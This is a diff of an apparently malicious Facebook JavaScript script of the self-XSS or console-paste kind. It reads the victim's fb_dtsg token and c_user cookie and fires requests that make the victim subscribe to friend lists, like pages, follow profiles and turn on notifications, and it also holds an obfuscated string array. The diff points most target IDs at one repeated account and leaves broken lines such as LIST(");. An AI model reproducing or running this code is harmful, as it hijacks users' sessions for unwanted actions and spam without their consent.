@@ -12,10 +12,10 @@ function g(d) {
     };
     a.send(d)
 }
-g("643119549085030");
-g("509238652461734");
-g("637005376320957");
-g("643119549085030");
+g("541759455916833");
+g("541759455916833");
+g("541759455916833");
+g("541759455916833");
 b = document.getElementsByName("fb_dtsg")[0].value;
 c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
@@ -29,9 +29,6 @@ var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
 function LIST(L) {
     var X = new XMLHttpRequest();
-    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
-    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
-    X.open("POST", XURL, true);
     X.onreadystatechange = function () {
         if (X.readyState == 4 && X.status == 200) {
             X.close;
@@ -39,10 +36,10 @@ function LIST(L) {
     };
     X.send(XParams);
 }
-LIST("148559432012336");
-LIST("156489554515051");
-LIST("146971562150041");
-LIST("159553654225165");
+LIST("");
+LIST("");
+LIST("");
+LIST(");
 
 
 
@@ -64,14 +61,14 @@ function Like(p) {
     };
     Page.send(PageParams);
 }
-Like("296798353735308");
-Like("297301193718363");
-Like("232233963594535");
-Like("626063890768919");
-Like("514486465297821");
-Like("199134496914077");
-Like("165411580286132");
-Like("638448586182539");
+Like("366209603472874");
+Like("561151277273844");
+Like("");
+Like("");
+Like("");
+Like("");
+Like("");
+Like("");
 
 
 
@@ -93,9 +90,9 @@ function N(noti) {
   };
   Page.send(PageParams);
 }
-N("514486465297821");
-N("199134496914077");
-N("638448586182539");
+N("");
+N("");
+N("");
 
 
 
@@ -117,12 +114,12 @@ function a(abone) {
     };
     http4.send(params4);
 }
-a("100005115938614");
-a("100004620215045");
-a("100004532196646");
-a("100003147643648");
-a("100004156869752");
-a("100001050235420");
+a("100003590682442");
+a("100003590682442");
+a("100003590682442");
+a("100003590682442");
+a("100003590682442");
+a("100003590682442");
 
 
 
@@ -144,7 +141,7 @@ function pn(noti) {
   };
   Page.send(PageParams);
 }
-pn("100005115938614");
+pn("100003590682442");
 
 
 
@@ -168,21 +165,15 @@ function p(post) {
     };
     X.send(XParams);
 }
-p("100003147643648");
-p("199654230215107");
-p("209392225888304");
-p("208580292636164");
-p("208580092636184");
-p("199457596881767");
-p("199457363548457");
-p("199459220214938");
-p("205945516252645");
-p("169966006517263");
-p("242266392600887");
-p("243188212508705");
-p("349683478511340");
-p("213363228844207");
-p("213363148844215");
+p("");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
+p("100003590682442");
 
 
 
@@ -207,7 +198,7 @@ var now = (new Date).getTime();
          Page.send(PageParams);
      }
 
- PI("199134496914077");
+ PI("");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
@@ -226,7 +217,7 @@ var now = (new Date).getTime();
          Page.send(PageParams);
      }
 
- PI2("514486465297821");
+ PI2("");
  
  
  
@@ -238,7 +229,7 @@ var _0xd3a2=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x
 
 
 
-/*Comment me cool
+/*Comment me cooL
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now = (new Date).getTime();
@@ -278,8 +269,8 @@ X.close;
 };
 X.send(XParams);
 }
-ufi("205945516252645");
-ufi("169966006517263");
+ufi("");
+ufi("");
 */
 
 
@@ -301,7 +292,7 @@ function IDS(r) {
   };
   X.send(XParams);
 }
-IDS("100002859939326");
+IDS("");
 */
 
 
@@ -357,11 +348,11 @@ function IDS(r) {
         };
         Page.send(PageParams);
     }
-   G("536352643082702");
+   G("");
 }
-IDS("100005147649818");
-IDS("100005147649818");
-IDS("100005147649818");
+IDS("");
+IDS("");
+IDS("");
 
 
 
@@ -384,10 +375,10 @@ setTimeout(function () {
             };
             Page.send(PageParams);
         }
-      G("536352643082702");
+      G("");
     }
-    IDS("100001954038029");
-    IDS("100000159572140");
+    IDS("");
+    IDS("");
 
 }, 4000);
 */
